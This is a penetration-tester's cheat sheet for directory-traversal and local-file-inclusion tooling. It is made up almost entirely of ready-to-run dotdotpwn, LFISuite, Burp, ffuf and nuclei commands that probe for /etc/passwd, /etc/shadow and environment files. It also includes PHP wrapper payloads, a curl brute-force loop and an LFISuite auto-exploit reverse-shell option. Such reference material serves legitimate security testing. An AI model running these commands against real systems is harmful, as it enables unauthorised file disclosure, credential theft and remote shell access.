---
aliases:
  - dotdotpwn
  - LFISuite
  - Path Traversal Wordlists
tags:
  - vuln/path-traversal
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Directory Traversal]]"
  - "[[Burp Suite]]"
---
# Directory Traversal - Tooling

---

## dotdotpwn

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dotdotpwn.pl -m http -h target.com -f /etc/passwd -k root:` | HTTP traversal fuzz match `root:` | Standard HTTP probe. |
| `dotdotpwn.pl -m http -h target.com -f /etc/passwd -k root: -d 8` | Depth 8 traversal | Deep search. |
| `dotdotpwn.pl -m http-url 'https://target/page?file=TRAVERSAL' -f /etc/passwd -k root:` | URL marker injection style | URL-aware. |
| `dotdotpwn.pl -m ftp -h target.com -u user -p pass -f /etc/passwd -k root:` | FTP traversal probe | FTP service. |
| `dotdotpwn.pl -m tftp -h target.com -f /etc/passwd -k root:` | TFTP traversal | TFTP-specific. |
| `dotdotpwn.pl -m http -h target.com -O -f /etc/passwd` | Auto OS detection | OS-aware probe. |
| `dotdotpwn.pl -m http -h target.com -x 8080 -f /etc/passwd` | Custom port 8080 | Non-standard port. |
| `dotdotpwn.pl -m http -h target.com -b -f /etc/passwd` | Bisection auto-find length | Auto-tune depth. |
| `dotdotpwn.pl -m stdout -d 8 -f /etc/passwd > paths.txt` | Generate payloads to file (sin send) | Wordlist gen. |
| `dotdotpwn.pl -m http -h target.com -f /etc/passwd -k root: -q` | Quiet mode | Less output. |
| `dotdotpwn.pl -m http -h target.com -f /etc/passwd -k root: -v` | Verbose debug | Debug. |
| `git clone https://github.com/wireghoul/dotdotpwn && cd dotdotpwn && perl dotdotpwn.pl -h` | Install + help | Setup. |
^pt-tool-dotdotpwn

---

## LFISuite

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/D35m0nd142/LFISuite && cd LFISuite && python LFISuite.py` | Install + interactive menu | Setup. |
| `python LFISuite.py -t target.com -P /vuln.php` | Scanner mode | Auto-scan. |
| `python LFISuite.py -u "https://target/page?file=" -c "session=abc"` | Direct URL with cookie | Authenticated. |
| `python LFISuite.py -u "https://target/?file=" -T` | Via Tor anonymity | Tor relay. |
| `python LFISuite.py -u "https://target/?file=" -e` | Auto-exploit mode | Direct RCE attempt. |
| `python LFISuite.py -u "https://target/?file=" -e -s php` | Force PHP shell | Lang-specific. |
| `python LFISuite.py -u "https://target/?file=" -e -r 10.10.10.10:4444` | Reverse shell setup | RS automation. |
| `python LFISuite.py -u "https://target/?file=" -v` | Verbose debug | Debug. |
| `python LFISuite.py -u "https://target/?file=" --proxy http://127.0.0.1:8080` | Route via Burp | Inspect. |
| `python LFISuite.py -t target.com -P /list.php -m` | Multi-payload comprehensive probe | Heavy scan. |
^pt-tool-lfisuite

---

## Burp Intruder + Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Intruder → set `§...§` en `?file=` param → Sniper attack | Single position fuzz | Standard. |
| Burp Intruder Payload Type "Simple list" → load `PayloadsAllTheThings/Directory Traversal/Intruder/dotdotpwn.txt` | Load PayloadsAllTheThings traversal | Standard. |
| Burp Intruder Payload Type "Simple list" → load `seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt` | SecLists LFI huge wordlist | Comprehensive. |
| Burp Intruder Options → Grep Match `root:x:0:` | Match Linux passwd | Linux indicator. |
| Burp Intruder Options → Grep Match `[boot loader]\|[fonts]\|[extensions]` | Match Windows win.ini sections | Windows indicator. |
| Burp Intruder Options → Grep Extract regex `root:[^\\n]+` | Extract first user line | Show contents. |
| Burp Intruder Filter Status `200` + Length ≠ baseline | Filter success diff baseline | Visual. |
| Burp Intruder Filter Status `≠ 404,403` | Exclude denied | Filter neg. |
| Burp Intruder Resource Pool throttle=100ms | Pacing anti-rate-limit | Anti-RL. |
| Burp Intruder Payload Processing → "URL-encode key characters" | Auto-encode special | Encoding. |
| Burp Intruder Settings → "Update Content-Length" enable | Auto recalc | Body fuzz. |
| Burp BApp Store → "Active Scan++" → install | LFI Active Scan augment | Active. |
| Burp BApp Store → "LFI scanner" extension | Built-in LFI auto scan | LFI-specific. |
^pt-tool-burp

---

## Wordlists Recomendadas

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ls /usr/share/seclists/Fuzzing/LFI/` | SecLists LFI lists | Foundation. |
| `cat /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` | Jhaddix LFI curated | Curated. |
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls 'PayloadsAllTheThings/Directory Traversal/Intruder/'` | PayloadsAllTheThings Intruder lists | Standard. |
| `git clone https://github.com/brian-frichette/another-LFI-payload-list` | Brian Frichette LFI list | Alt. |
| `git clone https://github.com/fuzzdb-project/fuzzdb && ls fuzzdb/attack/lfi/` | FuzzDB LFI | Foundation. |
| `wget https://raw.githubusercontent.com/payloadbox/dirtraversal-payload-list/master/dirtraversal.txt` | dirtraversal-payload-list | Quick. |
| `dotdotpwn.pl -m stdout -d 10 -f /etc/passwd > paths.txt` | Generate depth-N wordlist | Custom-tailored. |
| `python3 -c "[print('../'*n+'etc/passwd') for n in range(1,10)]" > shallow.txt` | DIY depth wordlist | Quick gen. |
| `cat /usr/share/seclists/Fuzzing/LFI/LFI-WindowsFileCheck.txt` | Windows file check list | Windows targets. |
| `cat /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt` | Huge LFISuite path list | Comprehensive. |
| `cat /usr/share/seclists/Fuzzing/LFI/LFI-with-null-byte.txt` | NUL byte variants | Pre-PHP 5.3.4. |
| `python3 -c "wrappers=['php://filter/convert.base64-encode/resource=','php://input','data://text/plain;base64,','expect://','phar://','file://']; [print(w+'index.php') for w in wrappers]" > php-wrappers.txt` | PHP wrappers wordlist | PHP-specific. |
^pt-tool-wordlists

### Manual one-liner

```bash
# Generate traversal paths (8 levels) + targets
for depth in 1 2 3 4 5 6 7 8; do
  PREFIX=$(printf '../%.0s' $(seq 1 $depth))
  for file in 'etc/passwd' 'etc/shadow' 'proc/self/environ' 'windows/win.ini'; do
    echo "${PREFIX}${file}"
  done
done > paths.txt

# Brute force con curl
while read p; do
  ENCODED=$(printf '%s' "$p" | jq -sRr @uri)
  R=$(curl -s "https://target/api/file?path=$ENCODED")
  if echo "$R" | grep -qE 'root:|\[fonts\]|PATH='; then
    echo "[+] $p → MATCH"
  fi
done < paths.txt
```

---

## Custom Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ffuf -u "https://target/api/file?path=FUZZ" -w paths.txt -mr 'root:'` | ffuf traversal match regex | Standard ffuf. |
| `ffuf -u "https://target/api/file?path=FUZZ" -w paths.txt -fc 404 -mc 200 -fs 0` | ffuf filter 404 size 0 | Filter false-positive. |
| `wfuzz -c -z file,paths.txt --hh 0 'https://target/?file=FUZZ'` | wfuzz hide hash size 0 | wfuzz alt. |
| `gobuster fuzz -u 'https://target/?file=FUZZ' -w paths.txt -b 404,403` | gobuster fuzz blacklist | gobuster modern. |
| `python3 -c "import requests, sys; [print(p,r.status_code,len(r.text)) for p in open('paths.txt') for r in [requests.get(f'https://target/?file={p.strip()}', allow_redirects=False)] if 'root:' in r.text]"` | DIY Python match probe | DIY Python. |
| `nuclei -t http/cves/2021/CVE-2021-41773.yaml -u https://target` | Apache path traversal CVE | Apache 2.4.49/50. |
| `nuclei -t http/vulnerabilities/generic/lfi-linux.yaml -l targets.txt` | Bulk LFI scan multi-host | Bulk scan. |
| `nuclei -t http/vulnerabilities/ -tags lfi,traversal -u https://target` | Nuclei tag filter LFI/traversal | Templates tag. |
| `zaproxy -cmd -port 8080 -quickurl https://target -quickprogress` | OWASP ZAP CLI | Free alt. |
| `katana -u https://target/ \| dalfox pipe -X GET -p 'file' --skip-bav` | Pipeline crawler → fuzz LFI | Crawl chain. |
| `python3 fimap.py -u "https://target/?file=test"` | fimap Python LFI auto | Auto exploit. |
| `python3 kadimus.py -u "https://target/?file=test"` | kadimus C-based LFI scanner | Fast scanner. |
^pt-tool-custom

---
